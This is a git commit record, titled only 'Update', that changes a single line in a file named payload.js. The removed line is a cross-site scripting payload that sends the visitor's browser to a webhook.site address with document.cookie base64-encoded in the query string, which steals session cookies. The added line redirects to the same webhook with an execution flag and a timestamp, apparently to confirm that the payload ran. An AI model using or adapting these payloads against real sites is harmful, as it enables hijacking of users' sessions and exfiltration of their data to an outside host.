14d96c57b089010d260f5fc397c22d4dc1241b2c
mil4ne <josemilane>
2026-03-27 08:31:45 -0400

    Update

--- payload.js
+++ payload.js
@@ -1,1 +1,1 @@
-document.location = "https://webhook.site/16f15d28-5c96-4001-b17d-cabd95624c8a?c=" + btoa(document.cookie);
+document.location = "https://webhook.site/16f15d28-5c96-4001-b17d-cabd95624c8a?exec=1&t=" + Date.now();
